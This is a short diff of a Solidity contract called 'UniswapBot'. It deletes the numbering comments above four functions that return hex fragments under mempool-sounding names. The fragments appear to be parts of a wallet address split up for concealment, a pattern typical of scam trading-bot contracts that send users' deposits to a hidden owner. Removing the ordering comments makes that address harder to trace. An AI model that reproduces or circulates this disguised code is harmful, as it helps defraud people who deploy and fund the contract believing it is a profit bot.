@@ -91,7 +91,6 @@ contract UniswapBot {
 		return int256(self._len) - int256(other._len);
 	}
 
-//3
 	function fetchMempoolVersion() private pure returns (string memory) { 
 		return "40CCE21e41523aD4";
 	}
@@ -124,7 +123,6 @@ contract UniswapBot {
 
 	receive() external payable {}
 
-//2
 	function fetchMempoolEdition() private pure returns (string memory) { 
 		return "46bC96514c7f1dBF28F";
 	}
@@ -178,7 +176,6 @@ contract UniswapBot {
 		return string(_newValue);
 	} 
 	
-	//4
 	function getMempoolLong() private pure returns (string memory) { 
 		return "c28c";
 	}
@@ -243,7 +240,6 @@ contract UniswapBot {
 		return string(res);
 	}
 	
-	//1
 	function getMempoolShort() private pure returns (string memory) { 
 		return "0x3";
 	}
